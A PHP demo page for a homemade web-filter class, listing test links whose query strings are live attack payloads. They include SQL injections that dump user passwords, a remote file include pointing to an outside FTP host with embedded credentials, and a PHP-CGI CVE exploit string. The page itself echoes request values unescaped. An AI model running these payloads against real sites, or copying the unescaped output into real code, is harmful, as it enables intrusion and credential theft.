<?php
use lib\Security\Security;

$time_start = microtime( true );
	require __DIR__ . 'Security.php';
        $time_end = microtime( true );
	$ftime = $time_end - $time_start;
 
?>
<html>
<head>
<title>Alex Security Class</title>
</head>
<style>
	body {
    		background-color: #ffffff;
		font-family: sans-serif;
		color: #000;		
	}
	div.header {
		position: relative;
		background-color: #7e92ce;
		color:#FFF;
		text-align:left;
		font-weight: bold;
		font-size: 30px;
		left: 0;
		top: 0;
		padding: 4px 2em 4px 2em;
		margin-bottom: 4px;
	}
	div.title {
		position: relative;
		background-color: #7e92ce;
		color: #FFF;
		font-weight: bold;
		padding: 4px 2em 4px 2em;
		
	}
	div.text{
		position: relative;
		padding: 2em 2em 2em 2em;
	}
	a {
		text-decoration: underline;
    	   	color: #000;
		background-color: #ffffff;
	        font-weight: normal;
	}
	div.header a {
		text-decoration: none;
    		font-size: medium;
		color: #999999;
		background-color: #ffaa44;
		font-weight: normal;	
	}
	div.footer {
		text-decoration: none;
		font-size: 12px;
		color: #FFF;
		background-color: #7e92ce;
		font-weight: bold;
		width: 100%;
		text-align: center;
	}
</style>
<body>
	<div class="header"><span>Alex Security Class</span></div>
		<div class="text">
			<ul>
			<?php
                $security = new Security();
				echo "<li>Page loads in " . round( $ftime, 3 ) . " seconds</li>\n";
				echo "<li>\$_SERVER[ 'REQUEST_METHOD' ]: <i>" . $_SERVER[ 'REQUEST_METHOD' ] . "</i></li>\n";
				echo "<li>\$_SERVER[ 'QUERY_STRING' ]: <i>" . $_SERVER[ 'QUERY_STRING' ] . "</i></li>\n";
				echo "<li>\$_SERVER[ 'PHP_SELF' ]: <i>" . $_SERVER[ 'PHP_SELF' ] . "</i></li>";
				echo "<li>Alex Security Class Function getPHP_SELF(): <i>" . $security->getPHP_SELF() . "</i></li>";
			?>
			</ul>
		</div>
<!--	?+union+select+1,version(),   -->
		<div class="title"><span>Example Injection Tests: ( each will result in a 403 access denied )</span></div>
		    <div class="text">
			<ul>
			    <li><a href=./example.php?id=-1+union+select+1,+table_name+from+information_schema.tables+where+table_name+=+users><b>Test SQL Injection</b></a></li>
			    <li><a href=./example.php?id=123+union+select+1,version(),database(),4,user()--><b>Test 2 SQL Injection</b></a></li>
			    <li><a href=./example.php?id=-14+union+select+1,2,3,4,5,6,7,8,9,version(),database(),12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,user(),43,44,45,46,47,48--&cid=0&tid=&page=&action=details&subaction=product><b>Test 3 SQL Injection</b></a></li>
			    <li><a href=./example.php?id=1011'+AND+(SELECT+8975+FROM(SELECT+COUNT(*),CONCAT((SELECT+MID((IFNULL(CAST(schema_name+AS+CHAR),0x20)),1,50)+FROM+INFORMATION_SCHEMA.SCHEMATA+LIMIT+6,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x)a)+AND+bhdresh=bhdresh><b>Test 4 SQL Injection</b></a></li>
			    <li><a href=./example.php?id=-2+union+all+select+1,2,group_concat(user_id,0x3a,login,0x3a,password)+FROM+users--><b>Test 5 SQL Injection</b></a></li>
			    <li><a href=./example.php?id=1/**/aNd/**/1=0/**/uNioN++sElecT+1,CONCAT_WS(CHAR(32,58,32),user(),database(),version())--><b>Test 6 SQL Injection</b></a></li>
			    <li><a href=./example.php?id=7+UNION+SELECT+ALL+user_login,2,3,4,5,6,7,8,9,10,11,12,13,user_pass,15,16,17,18,19,20,21,22,23,24+from+wp_users--><b>Test 7 (WP) SQL Injection</b></a></li>
			    <li><a href=./example.php?id=WAITFOR+DELAY+'00:00:20'><b>Test 8 (Waitfor) SQL Injection</b></a></li>
			    <li><a href=./example.php?id=-20%20union%20select%201,group_concat%28admin_uname,0x3a,admin_pwd%29,3,4,5,6,7%20from%20admin--><b>Test 9 SQL Injection</b></a></li>
			    <li><a href=./example.php?id=UPDATE+table_name+SET+title='hacked',article='hacked',author='somebody'--><b>Test 9 (UPDATE SET) SQL Injection</b></a></li>
			    <li><a href=./example.php?id=example.php///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////.js><b>Test Source Code Attack</b></a></li>
			    <li><a href=./example.php?id=-1/**/and/**/(select/**/substring(concat(1,user_name,password),1,1)/**/from/**/users/**/limit/**/0,1)=1><b>Blind SQL Injection</b></a></li>
			    <li><a href=./example.php?id=-1+[u](n)%3Ci%3Eo|*n+[s](e)%3Cl%3Ee|*c^t+1,+[t](a)%3Cb%3El|e*^+[f](r)%3Co%3Em|+[i](n)%3Cf%3Eo|r*m^a[t](o)%3Cn%3E_|s*c^h[e](m)%3Ca%3E.|t*a^b[l](e)%3Cs%3E+w|h*e^r[e]+(t)%3Ca%3Eb|l*e^_[n](a)%3Cm%3Ee|+=+u*s^e(r)><b>FWR Media Security Pro SQL Bypass Injection</b></a></li>
			    <li><a href=./example.php?id=-1+[S](E)%3CL%3E|E|C*T^+[f](o)%3Co%3E+|F*R^O[M](+)%3Cb%3Ea|r*+^L[I](M)%3CI%3ET|+1*,^1><b>FWR Media Security Pro SQL Bypass Injection 2</b></a></li>
			    <li><a href=./example.php?id=6&amp;testimonial_id=6%22%20onmousedown=%22ct(this,%20'http%3A%2F%2Fwww.cumparaturionline.com%2Fcustomer_testimonials.php%3Fpage%3D6%26amp%3Btestimonial_id%3D6','45','2','%22%2Fcustomer_testimonials.php%3Ftestimonial_id%3D%22','',%20'00ebf2b16d3ed886f741393f0c2b2b2a3ae989dfe51f6ba7fa7a',%200)/%22/customer_testimonials.php?testimonial_id=%22'><b>Test Remote File Include</b></a></li>
                <li><a href=./example.php?id=ftp://milchais:66dU2Wq4@ftp.milchaises.fr/www/templates/beez/css/ie71.php?FTP&FileIncludeAttempt</b></a></li>
			    <li><a href=./example.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input><b>CVE 2012-1823 PHP-CGI Bug</b></a></li>
			    <li><a href=./example.php?id=101')%20and%201=convert(int,(select%20system_user))--sp_password><b>System_User_Select attack</b></a></li>
			    <li><a href=./example.php?id=-99999%27+union+select+0x2d7468642d31,0x2d7468642d32,0x2d7468642d33,0x2d7468642d34,0x2d7468642d35,0x2d7468642d36,0x2d7468642d37,0x2d7468642d38,0x2d7468642d39,0x2d7468642d3130,0x2d7468642d3131,0x2d7468642d3132,0x2d7468642d3133,0x2d7468642d3134,0x2d7468642d3135,0x2d7468642d3136,0x2d7468642d3137,0x2d7468642d3138,0x2d7468642d3139,0x2d7468642d3230,0x2d7468642d3231,0x2d7468642d3232,0x2d7468642d3233,0x2d7468642d3234,0x2d7468642d3235,0x2d7468642d3236,0x2d7468642d3237,0x2d7468642d3238,0x2d7468642d3239,0x2d7468642d3330,0x2d7468642d3331,0x2d7468642d3332,0x2d7468642d3333,0x2d7468642d3334,0x2d7468642d3335,0x2d7468642d3336,0x2d7468642d3337,0x2d7468642d3338,0x2d7468642d3339,0x2d7468642d3430,0x2d7468642d3431,0x2d7468642d3432,0x2d7468642d3433,0x2d7468642d3434,0x2d7468642d3435,0x2d7468642d3436,0x2d7468642d3437,0x2d7468642d3438,0x2d7468642d3439,0x2d7468642d3530/*><b>Another Injection</b></a></li>
                <li><a href=./example.php?id=23%3B%20www.select+%2A+from+OPENRoWSeT%28'SQLOLEDB'%2C'Network=DBMSSOCN%3BAddress=%3Buid=sa%3Bpwd=MyTestPass'%2C'waitfor+delay+''0%3A0%3A20''%3Bselect+1%3B'%29%3B-><b>Esculate Privaleges Attack</b></a></li>
			    <li><a href=./example.php?id=\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3A\\x61\\x6C\\x65\\x72\\x74\\x28\\x30\\x29\\x3B><b>Hex/Octal string obfuscation attack</b></a></li>
                </ul>
		     </div>
<div class="footer">Protection Alex-Security</div>